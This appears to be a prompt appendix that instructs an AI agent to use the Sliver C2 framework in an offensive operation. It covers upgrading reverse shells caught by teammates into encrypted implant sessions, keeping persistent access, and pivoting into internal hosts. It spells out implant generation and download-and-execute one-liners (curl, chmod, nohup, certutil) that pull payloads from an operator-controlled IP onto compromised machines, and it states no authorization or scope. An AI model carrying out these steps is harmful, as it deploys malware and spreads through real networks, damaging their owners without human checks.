# Sliver C2 Backend Appendix

This appendix configures you to use **Sliver C2** as the preferred backend.
Initial shells are always caught via shell-server (teammates handle this).
You upgrade established shells to Sliver C2 sessions for encrypted transport,
file transfer, and pivoting.

**shell-server remains the initial access method.** Teammates establish raw
reverse shells. You upgrade to Sliver through the existing shell.

## Backend Tools

Sliver: `mcp__sliver-server__<tool>`
Shell-server: `mcp__shell-server__<tool>`

## [shell-established] Implementation — C2 Upgrade

When a teammate hands you an established shell-server session:

```
1. Verify session exists via shell-server list_sessions()
2. Stabilize the raw shell first: stabilize_shell(session_id)
3. Determine target OS from platform field
4. Start Sliver mTLS listener: start_mtls_listener(port=<free_port>)
5. Generate implant: generate_implant(target_os, arch="amd64",
     mtls_host=<callback_ip>, mtls_port=<listener_port>)
6. Serve implant via HTTP:
   Run: python3 -m http.server <serve_port> --directory <implant_dir>
7. Download + execute implant through the existing shell:
   Linux: send_command(session_id, "curl http://<ip>:<port>/<file> -o /tmp/i && chmod +x /tmp/i && nohup /tmp/i &")
   Windows: send_command(session_id, "certutil -urlcache -f http://<ip>:<port>/<file> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe")
8. Poll sliver-server list_sessions() for new Sliver session (3s intervals, 10 attempts)
9. If Sliver session connects:
   a. Stop the HTTP server
   b. Send [session-ready] with backend=sliver
10. If Sliver upgrade fails (download fails, implant killed, port filtered):
    a. Fall back to shell-server: send [session-ready] with backend=shell-server
    b. The raw shell still works — don't lose it trying to upgrade
```

**Critical: never close the shell-server session until Sliver is confirmed.**
The raw shell is the fallback. If C2 upgrade fails, the engagement continues
via shell-server.

## [setup-process] Implementation

Credential-based access still uses shell-server:

```
Call mcp__shell-server__start_process(...)
Send [process-ready] with backend=shell-server
```

## [shell-dropped] Recovery

For Sliver sessions: Sliver reconnects automatically (mTLS persistent).
If `list_sessions()` shows `alive=false` after 30s, attempt re-establishment.

For shell-server sessions: same recovery as shell-server appendix —
start new listener, re-deliver saved payload.

## Handoff Instructions

For Sliver sessions:
```
[session-ready] session_id=<id> backend=sliver platform=<linux|windows>
  Use mcp__sliver-server__execute(session_id="<id>", exe="...", args="...") for commands.
  Use mcp__sliver-server__upload/download for file transfer.
```

For shell-server sessions (fallback or credential-based):
```
[session-ready] session_id=<id> backend=shell-server platform=<linux|windows>
  Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
```

## Pivoting (via Sliver)

When the lead requests a pivot through a compromised host with a Sliver session:
```
1. start_pivot_listener(session_id, "tcp", bind_port=<port>)
2. Generate new implant targeting the pivot host as callback
3. Deliver pivot implant to internal target through the existing session
4. New Sliver session appears — routed through the pivot
```
